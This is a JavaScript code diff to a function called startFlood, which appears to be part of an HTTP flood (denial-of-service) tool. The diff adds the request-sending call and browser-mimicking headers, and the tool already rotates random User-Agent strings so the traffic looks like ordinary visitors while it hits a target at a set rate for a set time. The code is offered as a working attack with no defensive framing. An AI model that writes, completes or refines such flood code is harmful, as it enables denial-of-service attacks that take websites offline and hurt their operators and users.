@@ -61,14 +61,26 @@ function startFlood() {
   const interval = setInterval(() => {
     for (let i = 0; i < rps; i++) {
       const options = {
+        host: parsed.hostname,
+        port: parsed.port,
+        path: parsed.pathname,
         method: 'GET',
         headers: {
-          'Host': host,
-          'Accept': 'application/json',
+          'Host': parsed.host,
+          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
           'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
-          'Connection': 'keep-alive'
-        }
+          'Upgrade-Insecure-Requests': '1',
+          'Accept-Encoding': 'gzip, deflate',
+          'Accept-Language': 'en-US,en;q=0.9',
+          'Cache-Control': 'max-age=0',
+          'Connection': 'Keep-Alive'
+        },
       };
 
+      const request = http.request(options);
+      request.end();
+    }
+  });
+
   setTimeout(() => clearInterval(interval), time * 1000);
-  }
+    }
